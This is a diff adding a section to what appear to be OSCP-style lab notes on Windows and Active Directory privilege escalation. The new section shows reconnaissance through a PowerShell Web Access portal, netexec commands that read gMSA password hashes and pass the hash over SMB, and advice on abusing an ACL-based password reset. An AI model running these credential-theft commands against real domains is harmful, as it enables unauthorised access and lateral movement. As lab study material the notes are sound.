@@ -851,6 +851,28 @@ See [[27. Assembling the Pieces|AEN.8 Q3]] for the full example.
 ---
 
 #### Tags: #WindowsPrivesc #CommandAppendix #Module17 #DLLHijack #ServiceBinaryHijacking #UnquotedServicePath #ScheduledTasks #KernelExploit #SeImpersonatePrivilege #SeBackupPrivilege #winPEAS #PowerUp #SigmaPotato #CVE202328252 #CVE202329360 #SeDebugPrivilege #SeTakeOwnershipPrivilege #SeLoadDriverPrivilege #AppLocker #DnsAdmins #ServerOperators #EventLogReaders #HiveNightmare #PrintNightmare #CredentialHunting #mRemoteNG #SCFAttack #LaZagne #SharpChrome #SessionGopher #Restic #Pillaging #SysaxAutomation #HTBSupplementary
+## Certificate-authenticated PSWA and gMSA follow-on
+
+When a user certificate opens an IIS PowerShell Web Access portal, use the browser session to establish a Windows identity, then run group and privilege triage:
+
+~~~powershell
+whoami
+hostname
+whoami /groups
+whoami /priv
+~~~
+
+From an authorised Kali identity, query readable gMSA passwords and record PrincipalsAllowedToReadPassword:
+
+~~~bash
+netexec ldap $BoxIP -u $Username -p $Password --gmsa
+netexec smb $BoxIP -u 'BIR-ADFS-GMSA$' -H $GmsaHash
+~~~
+
+If the directory right permits a target password reset, validate the reset once and check for Pwn3d! before using a minimal WMI read command. This is an AD ACL path, not a generic local privilege escalation.
+
+See [[OSCP/BOXES/WRITE UPS/AD/Search|Search]] and [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]].
+
 ## External Resources
 
 - [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
